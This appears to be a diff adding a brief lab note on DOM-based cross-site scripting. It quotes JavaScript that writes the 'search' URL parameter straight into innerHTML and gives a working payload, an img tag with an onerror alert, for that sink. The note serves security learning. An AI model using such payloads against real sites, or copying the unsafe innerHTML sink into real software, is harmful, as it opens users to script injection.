@@ -1,0 +1,16 @@
+#Take advantage of location.search function to inject payload into DOM
+
+
+
+#vulnerable JS
+<script>
+                            function doSearchQuery(query) {
+                                document.getElementById('searchMessage').innerHTML = query;
+                            }
+                            var query = (new URLSearchParams(window.location.search)).get('search');
+                            if(query) {
+                                doSearchQuery(query);
+                            }
+                        </script>
+#payload
+?search=<img src=1 onerror=alert(1)>
